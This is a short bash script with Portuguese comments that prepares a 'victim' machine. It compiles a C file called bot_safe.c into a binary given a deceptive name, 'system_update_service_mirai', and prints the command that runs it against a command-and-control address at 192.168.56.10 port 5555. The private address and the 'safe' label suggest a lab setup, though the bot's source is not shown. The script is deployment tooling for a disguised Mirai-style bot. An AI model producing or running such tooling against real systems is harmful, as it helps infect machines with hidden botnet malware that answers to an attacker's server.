#!/bin/bash
# setup_bot.sh - Prepara a Vítima
# Certifique-se de ter o arquivo: bot_safe.c

TARGET_IP="192.168.56.10" # IP do seu C2
TARGET_PORT="5555"

echo "[*] Compilando o Malware (Bot Safe)..."
gcc bot_safe.c -o system_update_service_mirai  # Nome disfarçado

if [ $? -eq 0 ]; then
    echo "[+] Compilação bem-sucedida!"
    echo "[*] Binário criado como 'system_update_service_mirai' para disfarce."
else
    echo "[-] Erro na compilação."
    exit 1
fi

echo "[!] Para infectar a máquina, execute:"
echo "    ./system_update_service_mirai $TARGET_IP $TARGET_PORT"